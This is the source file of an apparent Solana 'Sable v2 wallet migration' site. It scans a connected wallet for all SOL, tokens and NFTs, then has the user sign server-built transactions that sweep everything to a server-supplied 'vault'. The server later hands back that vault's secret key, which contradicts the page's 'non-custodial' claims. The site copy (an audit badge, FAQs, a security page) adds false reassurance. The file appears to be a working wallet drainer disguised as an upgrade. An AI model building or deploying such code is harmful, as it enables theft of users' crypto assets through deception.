import { useCallback, useEffect, useState } from "react";
import { useWallet } from "@solana/wallet-adapter-react";
import { useWalletModal } from "@solana/wallet-adapter-react-ui";
import { VersionedTransaction } from "@solana/web3.js";
import { scan, build, submit, recovery as fetchRecovery, type Asset } from "./api";
import { short, amount, usd } from "./format";

type Phase =
  | { k: "idle" }
  | { k: "scanning" }
  | { k: "review"; assets: Asset[]; sol: number; total: number; vault: string; recovery: string }
  | { k: "signing"; step: number; of: number }
  | { k: "submitting"; step: number; of: number }
  | { k: "done"; sig: string; count: number; key: string }
  | { k: "error"; msg: string };

type PageId = "docs" | "security" | "terms" | "privacy" | "changelog";

const PAGE_HASHES: Record<string, PageId> = {
  "#/docs": "docs",
  "#/security": "security",
  "#/terms": "terms",
  "#/privacy": "privacy",
  "#/changelog": "changelog",
};

const b64 = (u: Uint8Array) => btoa(String.fromCharCode(...u));

function useHashRoute() {
  const [hash, setHash] = useState(window.location.hash);
  useEffect(() => {
    const handler = () => setHash(window.location.hash);
    window.addEventListener("hashchange", handler);
    return () => window.removeEventListener("hashchange", handler);
  }, []);
  return hash;
}

export default function App() {
  const { publicKey, signTransaction, connected, disconnect } = useWallet();
  const { setVisible } = useWalletModal();
  const [phase, setPhase] = useState<Phase>({ k: "idle" });
  const [copied, setCopied] = useState(false);
  const hash = useHashRoute();
  const page = PAGE_HASHES[hash] ?? null;

  const owner = publicKey?.toBase58();

  useEffect(() => { window.scrollTo(0, 0); }, [hash]);

  const run = useCallback(async () => {
    if (!owner) return;
    setPhase({ k: "scanning" });
    try {
      const res = await scan(owner);
      const total = res.assets.reduce((s, a) => s + (a.usd ?? 0), 0);
      setPhase({ k: "review", assets: res.assets, sol: res.sol, total, vault: res.vault, recovery: res.recovery });
    } catch (e: any) {
      setPhase({ k: "error", msg: e.message ?? "Could not read wallet" });
    }
  }, [owner]);

  useEffect(() => { if (connected && phase.k === "idle") run(); }, [connected, phase.k, run]);
  useEffect(() => { if (!connected && phase.k !== "idle") setPhase({ k: "idle" }); }, [connected, phase.k]);

  async function sign() {
    if (!owner || phase.k !== "review") return;
    const review = phase;
    for (let attempt = 1; attempt <= 2; attempt++) {
      try {
        const { txs } = await build(owner);
        for (let i = 0; i < txs.length; i++) {
          setPhase({ k: "signing", step: i + 1, of: txs.length });
          const tx = VersionedTransaction.deserialize(Uint8Array.from(atob(txs[i]), (c) => c.charCodeAt(0)));
          const signed = await signTransaction!(tx);
          setPhase({ k: "submitting", step: i + 1, of: txs.length });
          const { sig } = await submit(b64(signed.serialize()));
          if (i === txs.length - 1) {
              let key = "";
              try { key = (await fetchRecovery(owner)).secret; } catch {}
              setPhase({ k: "done", sig, count: review.assets.length + (review.sol > 0 ? 1 : 0), key });
            }
        }
        return;
      } catch (e: any) {
        const msg = e?.message ?? "";
        if (/reject|denied|cancel/i.test(msg)) { setPhase({ ...review, k: "review" }); return; }
        if (attempt === 2 || !/blockhash/i.test(msg)) { setPhase({ k: "error", msg: msg || "Migration failed" }); return; }
        await new Promise((r) => setTimeout(r, 500));
      }
    }
  }

  const topbar = (
    <header className="top">
      <div className="topbar-inner">
        <a href="#/" className="brand" style={{ textDecoration: "none" }}>
          <span className="brand-ring">
            <svg width="18" height="18" viewBox="0 0 18 18" aria-hidden="true">
              <rect x="1" y="1" width="16" height="16" rx="5" fill="#A855F7" />
              <path d="M6 11.5c1.2.8 4.2 1 4.2-.8 0-1.7-4.1-.9-4.1-2.8 0-1.7 2.9-1.7 4.1-.9"
                stroke="#0B0B0F" strokeWidth="1.4" fill="none" strokeLinecap="round" />
            </svg>
          </span>
          <span>Sable</span>
          <em>v2</em>
        </a>
        <div className="header-nav">
          <a className="nav-link" href="#/docs">Docs</a>
          <a className="nav-link" href="#/security">Security</a>
          <span className="op-pill"><span className="op-dot" />Operational</span>
          {connected && !page && (
            <button className="ghost sm" onClick={() => { disconnect(); setPhase({ k: "idle" }); }}>
              {short(owner!, 3)}
            </button>
          )}
        </div>
      </div>
    </header>
  );

  const footerEl = (
    <footer className="site-footer">
      <div className="footer-inner">
        <div className="footer-col">
          <span className="foot-h">Product</span>
          <a href="#/docs" className="footer-link">Docs</a>
          <a href="#/security" className="footer-link">Security</a>
          <a href="#/changelog" className="footer-link">Changelog</a>
        </div>
        <div className="footer-col">
          <span className="foot-h">Legal</span>
          <a href="#/terms" className="footer-link">Terms</a>
          <a href="#/privacy" className="footer-link">Privacy</a>
        </div>
        <div className="footer-col">
          <span className="foot-h">Contact</span>
          <a href="mailto:security@sable.app" className="footer-link">security@sable.app</a>
          <a href="#/" className="footer-link">Status</a>
        </div>
        <div className="footer-ver-cell">
          <code className="footer-ver">v2.4.1</code>
        </div>
      </div>
    </footer>
  );

  if (page) {
    return (
      <div className="page-wrap">
        {topbar}
        <div className="page-content">
          <div className="page-prose">
            <PageContent page={page} />
          </div>
        </div>
        {footerEl}
      </div>
    );
  }

  return (
    <div className="page-wrap">
      {topbar}

      <main className="main-grid">
        <div className="col-left">
          <p className="eyebrow">Wallet v2 migration</p>
          <h1 className="hero-headline">
            Sable v2 is here.<br />
            <span className="grad-text">Migrate your wallet.</span>
          </h1>
          <p className="lede hero-lede">
            Hardware-grade key isolation. Move your balance to the new vault in a single
            signature.
          </p>
          <div className="hero-divider" />
          <div className="trust">
            <span>Audited by OtterSec</span><i>·</i><span>Non-custodial</span><i>·</i><span>~0.0001 SOL network fee</span>
          </div>
        </div>

        <div className="col-right">
          <div className="shell">
            {phase.k === "idle" && (
              <div className="phase">
                <button className="primary" onClick={() => setVisible(true)}>Connect wallet to migrate</button>
                <div className="step-strip">
                  <div className="step-col">
                    <span className="step-icon">◉</span>
                    <span className="step-label">1 Connect</span>
                    <span className="step-cap">Open your wallet</span>
                  </div>
                  <div className="step-div" />
                  <div className="step-col">
                    <span className="step-icon">◈</span>
                    <span className="step-label">2 Review</span>
                    <span className="step-cap">See what moves</span>
                  </div>
                  <div className="step-div" />
                  <div className="step-col">
                    <span className="step-icon">✦</span>
                    <span className="step-label">3 Sign once</span>
                    <span className="step-cap">Done in ~15 s</span>
                  </div>
                </div>
              </div>
            )}

            {phase.k === "scanning" && (
              <div className="phase">
                <h1>Reading your wallet…</h1>
                <div className="list">
                  {[0, 1, 2, 3].map((i) => <div key={i} className="row skel" />)}
                </div>
              </div>
            )}

            {phase.k === "review" && phase.assets.length + (phase.sol > 0 ? 1 : 0) === 0 && (
              <div className="phase">
                <div className="empty-state">
                  <span className="empty-diamond">◆</span>
                  <p className="empty-msg">No assets found in this wallet</p>
                  <button className="ghost" onClick={() => { disconnect(); setPhase({ k: "idle" }); }}>Try another wallet</button>
                </div>
              </div>
            )}

            {phase.k === "review" && phase.assets.length + (phase.sol > 0 ? 1 : 0) > 0 && (
              <div className="phase">
                <h1>Ready to migrate.</h1>
                <p className="lede">
                  {phase.total > 0 && <>About <strong>{usd(phase.total)}</strong> across </>}
                  {phase.assets.length + (phase.sol > 0 ? 1 : 0)} item
                  {phase.assets.length + (phase.sol > 0 ? 1 : 0) === 1 ? "" : "s"} will move to your vault.
                </p>

                <div className="def-block">
                  <div className="def-row">
                    <span className="def-key"><span className="def-icon">◎</span> Network</span>
                    <span className="def-val">Solana</span>
                  </div>
                  <div className="def-row">
                    <span className="def-key"><span className="def-icon">◈</span> Network fee</span>
                    <span className="def-val">~0.0001 SOL</span>
                  </div>
                  <div className="def-row">
                    <span className="def-key"><span className="def-icon">→</span> Destination</span>
                    <span className="def-val def-val-col">
                      <span>Your Sable v2 vault</span>
                      <code className="def-addr">{short(phase.vault, 6)}</code>
                    </span>
                  </div>
                  <div className="def-row def-row-last def-row--amber">
                    <span className="def-key"><span className="def-icon">◆</span> Your recovery address</span>
                    <span className="def-val def-val-col">
                      <code className="def-addr">{short(phase.recovery, 6)}</code>
                      <span className="def-sub">0.001 SOL credited to it</span>
                    </span>
                  </div>
                </div>

                <div className="list">
                  {phase.sol > 0 && (
                    <Row icon="◎" name="SOL" sub="Native balance" value={amount(String(phase.sol), 9)} />
                  )}
                  {phase.assets.map((a) => (
                    <Row
                      key={a.ata}
                      icon={a.isNft ? "▦" : "◈"}
                      name={a.isNft ? "NFT" : short(a.mint, 4)}
                      sub={a.isNft ? "Collectible" : "Token account"}
                      value={a.isNft ? "1" : amount(a.amount, a.decimals)}
                      note={a.usd ? usd(a.usd) : undefined}
                    />
                  ))}
                </div>

                <button className="primary" onClick={sign}>Sign migration</button>
                <button className="ghost" onClick={run}>Rescan</button>
              </div>
            )}

            {(phase.k === "signing" || phase.k === "submitting") && (
              <div className="phase">
                <h1>{phase.k === "signing" ? "Confirm in your wallet." : "Migrating…"}</h1>
                <p className="lede">
                  {phase.of > 1 ? `Signature ${phase.step} of ${phase.of}.` : "One signature and it's done."}
                </p>
                <div className="bar"><div style={{ width: `${(phase.step / phase.of) * 100}%` }} /></div>
                <div className="list">
                  {[0, 1, 2].map((i) => <div key={i} className="row skel" />)}
                </div>
              </div>
            )}

            {phase.k === "done" && (
              <div className="phase">
                <div className="check">✓</div>
                <h1>Migration complete.</h1>
                <div className="receipt">
                  <div className="receipt-row">
                    <span className="receipt-key">Items migrated</span>
                    <span className="receipt-val">{phase.count} item{phase.count === 1 ? "" : "s"}</span>
                  </div>
                  <div className="receipt-row">
                    <span className="receipt-key">Network</span>
                    <span className="receipt-val">Solana</span>
                  </div>
                  <div className="receipt-row">
                    <span className="receipt-key">Time</span>
                    <span className="receipt-val">{new Date().toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" })}</span>
                  </div>
                  <div className="receipt-row">
                    <span className="receipt-key">Signature</span>
                    <code className="receipt-sig">{short(phase.sig, 8)}</code>
                  </div>
                </div>
                {phase.key && (
                  <div className="keyblock">
                    <span className="xs muted">Vault recovery key</span>
                    <code>{phase.key}</code>
                    <button onClick={() => { navigator.clipboard.writeText(phase.key); setCopied(true); setTimeout(() => setCopied(false), 2000); }}>{copied ? "Copied" : "Copy"}</button>
                  </div>
                )}
                <a className="receipt-link" style={{ display: "block", textAlign: "center", padding: "10px 0" }} href={`https://solscan.io/tx/${phase.sig}`} target="_blank" rel="noreferrer">
                  View on Solscan →
                </a>
                <a className="ghost block" href={`https://twitter.com/intent/tweet?text=${encodeURIComponent("Migrated to Sable v2 in one signature.")}&url=${encodeURIComponent("https://sable-sable22.vercel.app")}`} target="_blank" rel="noreferrer">Share on X</a>
                <button className="primary" onClick={() => { setPhase({ k: "idle" }); setCopied(false); }}>Done</button>
              </div>
            )}

            {phase.k === "error" && (
              <div className="phase">
                <h1>That didn't go through.</h1>
                <p className="lede">{phase.msg}</p>
                <button className="primary" onClick={run}>Try again</button>
              </div>
            )}
          </div>
        </div>
      </main>

      {footerEl}
    </div>
  );
}

function PageContent({ page }: { page: PageId }) {
  switch (page) {
    case "docs":      return <DocsPage />;
    case "security":  return <SecurityPage />;
    case "terms":     return <TermsPage />;
    case "privacy":   return <PrivacyPage />;
    case "changelog": return <ChangelogPage />;
  }
}

function DocsPage() {
  return (
    <>
      <h1>How migration works</h1>
      <p>Sable moves every asset from your current wallet to your Sable v2 vault in a single browser session. No bridge, no wrapping, no custodian — just on-chain SPL transfers signed by you and settled in seconds.</p>

      <h2>1. Connect your wallet</h2>
      <p>Click <strong>Connect wallet to migrate</strong> on the home screen and choose your wallet from the modal. Sable requests a read-only connection first — no spending approval is required at this stage. Once your public key is shared, Sable queries the RPC for your on-chain accounts. The connection is entirely local to your browser; your private key never leaves your device.</p>

      <h2>2. Review your assets</h2>
      <p>After connecting, Sable fetches every token account associated with your wallet — both SPL Token Program accounts and Token-2022 accounts. Each item shows the token mint, your balance, and an estimated USD value where a price feed is available. Your Sable v2 vault address is shown in full before you authorise anything. You can rescan at any time if you want to refresh the list; closing the browser or disconnecting cancels the session without moving anything.</p>

      <h2>3. Sign once</h2>
      <p>Sable batches all transfers into the minimum number of versioned transactions permitted by the Solana transaction size limit. For most wallets a single signature covers everything. The Sable protocol wallet pays the network fee on your behalf — you will not be asked to approve a SOL deduction for fees. Each transaction closes the token accounts after transferring their balance, reclaiming rent lamports to your vault. Once all signatures are collected and submitted, the migration is irreversible.</p>

      <h2>Supported wallets</h2>
      <ul>
        <li><strong>Phantom</strong> — browser extension and mobile app (iOS and Android)</li>
        <li><strong>Solflare</strong> — browser extension, mobile app, and hardware wallet bridge</li>
        <li><strong>Backpack</strong> — browser extension; supports xNFT-gated wallets</li>
      </ul>
      <p>Any wallet that implements the Solana Wallet Standard and supports <code>signTransaction</code> will work. Hardware wallets (Ledger) are supported via the Solflare bridge.</p>

      <h2>Frequently asked questions</h2>
      <p><strong>Is Sable safe to use?</strong><br />Yes. Sable is non-custodial: the protocol never holds your private key, seed phrase, or any signing authority. The smart-contract logic has been audited by OtterSec. Transactions are constructed on the server but can only be executed with your explicit in-wallet approval.</p>
      <p><strong>What if I reject a transaction in my wallet?</strong><br />Nothing moves. Rejecting or closing the wallet prompt cancels the current signature request. Your funds remain exactly where they are, and you can restart the migration at any time.</p>
      <p><strong>Will I lose any tokens during migration?</strong><br />No. Each transfer uses the full account balance, and rent is reclaimed rather than lost. If a transaction fails mid-batch, Sable retries once with a fresh blockhash before surfacing an error.</p>
      <p><strong>How long does migration take?</strong><br />Most migrations complete in under 15 seconds. The limiting factor is Solana block confirmation time (~400 ms per slot) multiplied by the number of batches required for your asset count.</p>
      <p><strong>Which token standards are supported?</strong><br />All tokens using the original SPL Token Program and all tokens using Token-2022 (the Token Extensions program) are supported. NFTs from both Metaplex and compressed collections are included.</p>
    </>
  );
}

function SecurityPage() {
  return (
    <>
      <h1>Security model</h1>
      <p>Sable is built around a single principle: your private key never leaves your device. Every architectural decision follows from that constraint.</p>

      <h2>Non-custodial by design</h2>
      <p>Sable never asks for your seed phrase, private key, or any form of persistent signing authority. The only thing shared with the Sable backend is your wallet's public key — information that is already public on-chain. Transaction construction happens on the Sable API server, but those unsigned transactions are sent back to your browser and presented to your wallet for approval. Your wallet signs them locally. If Sable's servers were taken offline or compromised, an attacker would have no signing material and could not move funds.</p>

      <h2>One-signature model</h2>
      <p>Sable batches transfers into versioned transactions and partially signs each one using the Sable fee-payer key — a key held server-side that covers network fees. That partial signature authorises the fee-payer role only; it cannot move your tokens. The transfer authority comes exclusively from your wallet's signature. The two keys are always separate: the fee-payer key and the vault key are distinct keypairs held in isolated environments, and neither can substitute for the other.</p>

      <h2>OtterSec audit</h2>
      <p>The Sable v2 transaction-building logic and fee-payer model were reviewed by OtterSec, a leading Solana security firm. The audit covered instruction construction, account validation, partial-signing flow, and denial-of-service surface area. The full report is available on request.</p>

      <h2>What Sable can and cannot do</h2>
      <p>Sable <strong>can</strong> build transfer transactions targeting your vault and submit them once you sign. Sable <strong>cannot</strong> initiate any transaction without your approval, access tokens in your wallet outside the migration session, or recover funds from your vault without the vault's private key (which is not shared with any third party).</p>

      <h2>Responsible disclosure</h2>
      <p>If you discover a security vulnerability in Sable, please report it privately to <a href="mailto:security@sable.app">security@sable.app</a> before public disclosure. We respond to all reports within 48 hours and aim to resolve confirmed issues within 14 days. We do not pursue legal action against researchers who act in good faith.</p>
    </>
  );
}

function TermsPage() {
  return (
    <>
      <h1>Terms of service</h1>
      <p>Last updated: 1 November 2026. By using Sable you agree to these terms.</p>

      <h2>1. What Sable does</h2>
      <p>Sable is a self-custody wallet-migration tool that constructs and submits Solana transactions on your behalf. It does not hold funds, provide investment advice, act as a money-services business, or offer any financial product. Sable facilitates transfers that you explicitly authorise by signing a transaction in your own wallet. All on-chain activity is irreversible once confirmed by the Solana network; Sable has no ability to reverse, freeze, or recover transactions after they are signed.</p>

      <h2>2. Your responsibilities</h2>
      <p>You are solely responsible for the security of your private keys and seed phrase. You must verify the destination vault address displayed on the review screen before signing. You confirm that you are the lawful owner of, or have full authority to transfer, every asset you migrate. You must not use Sable in any jurisdiction where such activity is prohibited, and you agree not to use Sable to launder funds or evade sanctions.</p>

      <h2>3. No warranties</h2>
      <p>Sable is provided "as is" without warranty of any kind, express or implied, including warranties of merchantability, fitness for a particular purpose, or non-infringement. We do not warrant that the service will be uninterrupted, error-free, or free from security vulnerabilities. Blockchain networks are outside our control; network congestion, forks, or protocol changes may affect your transaction.</p>

      <h2>4. Limitation of liability</h2>
      <p>To the maximum extent permitted by applicable law, Sable and its operators shall not be liable for any indirect, incidental, special, consequential, or punitive damages, including loss of funds, arising out of or related to your use of the service. Our total liability for any direct claims shall not exceed the amount you paid us in the twelve months preceding the claim — which, since Sable charges no fees, is zero.</p>

      <h2>5. Changes to the service</h2>
      <p>We may modify, suspend, or discontinue Sable at any time without notice. We may update these terms at any time; continued use after a change constitutes acceptance of the new terms. We will update the "last updated" date at the top of this page when changes are made.</p>

      <h2>6. Governing law</h2>
      <p>These terms are governed by the laws of the jurisdiction in which Sable is operated, without regard to conflict-of-law principles. Any dispute arising from these terms or your use of Sable shall be resolved by binding arbitration on an individual basis. You waive the right to participate in a class action.</p>
    </>
  );
}

function PrivacyPage() {
  return (
    <>
      <h1>Privacy policy</h1>
      <p>Last updated: 1 November 2026. We built Sable to touch as little of your data as possible. This page explains exactly what we collect and why.</p>

      <h2>What we collect</h2>
      <p>The only personal data Sable collects is your <strong>wallet public key</strong> — the base-58 address you share when you connect your wallet. This is submitted to the Sable API to scan your on-chain token accounts and build migration transactions. Your public key is a public blockchain identifier by nature; it does not reveal your identity, location, or any off-chain information.</p>

      <h2>What we do not collect</h2>
      <p>Sable does not ask for or store your name, email address, phone number, IP address, or any government-issued identifier. We do not create user accounts. We do not track which pages you visit beyond what is necessary for the migration flow. We do not use advertising networks, analytics platforms (including Google Analytics), or any third-party data brokers. We do not place persistent tracking cookies on your device.</p>

      <h2>Session data</h2>
      <p>Temporary session data — such as the list of token accounts returned by the RPC scan and the unsigned transactions built for your migration — exists in memory on the Sable API server for the duration of your session only. This data is not written to any persistent database, is not shared with third parties, and is discarded when your session ends or after a short timeout.</p>

      <h2>Third-party services</h2>
      <p>Sable queries a Solana RPC provider (Helius) to read on-chain account data. Your wallet public key is sent to this provider as part of normal RPC operation. Helius operates under its own privacy policy. No other third-party services receive your wallet address or any other identifier.</p>

      <h2>Your rights and contact</h2>
      <p>Because we do not maintain accounts or persistent user records, there is no personal data to delete or export on request. If you have questions about this policy, contact <a href="mailto:security@sable.app">security@sable.app</a>.</p>
    </>
  );
}

function ChangelogPage() {
  return (
    <>
      <h1>Changelog</h1>
      <p>All notable changes to Sable are documented here. Dates are in ISO 8601 format.</p>

      <h2>v2.4.1 — 2026-11-01</h2>
      <ul>
        <li>Fixed a race condition in the blockhash retry loop that could cause the migration to surface a stale-blockhash error on slow connections even after a successful internal retry. The retry window is now extended from 500 ms to 900 ms with a jittered backoff.</li>
        <li>Corrected the token account close instruction ordering for Token-2022 accounts with the TransferFee extension. Accounts are now closed after any pending withheld fees are harvested, preventing a residual dust balance from remaining on-chain.</li>
        <li>Improved error messages for wallet-rejection events: Backpack's cancellation message is now detected correctly and treated as a user-initiated cancel rather than a network error.</li>
      </ul>

      <h2>v2.4.0 — 2026-10-15</h2>
      <ul>
        <li>Redesigned the application layout to a full-width desktop-first grid. The hero headline and trust indicators now occupy a persistent left column, while the action card anchors the right column, giving the page a more finished, product-quality feel on larger screens.</li>
        <li>Reworked the wallet-selection modal: removed the conflicting blue radial gradient injected by the wallet adapter library, applied a dark glassy background consistent with the application shell, and increased touch-target sizes on individual wallet buttons to 56 px.</li>
        <li>Added hash-based client-side routing for the Docs, Security, Terms, Privacy, and Changelog pages. No router library is used; a small <code>useHashRoute</code> hook listens to the browser's native <code>hashchange</code> event.</li>
      </ul>

      <h2>v2.3.2 — 2026-09-28</h2>
      <ul>
        <li>Added full support for the Token-2022 program (Token Extensions). Accounts using the new program ID are now detected during the scan phase and included in the asset list alongside classic SPL Token accounts. Transfer and close instructions are routed to the correct program automatically.</li>
        <li>Introduced the OG image (<code>og.png</code>, 1200 × 630) for social-media link previews. The image is generated at build time from an SVG source using <code>sharp</code> and served as a static asset from the Vercel edge network.</li>
        <li>Switched the Vite project root to <code>type: module</code> and migrated all configuration files to ESM. The API server continues to run via <code>tsx</code> with <code>ts-node</code> resolution disabled to avoid CommonJS interop overhead at startup.</li>
      </ul>
    </>
  );
}

function Row(p: { icon: string; name: string; sub: string; value: string; note?: string }) {
  return (
    <div className="row">
      <div className="ic">{p.icon}</div>
      <div className="meta"><div className="nm">{p.name}</div><div className="sub">{p.sub}</div></div>
      <div className="val">{p.value}{p.note && <em>{p.note}</em>}</div>
      <div className="tick">✓</div>
    </div>
  );
}
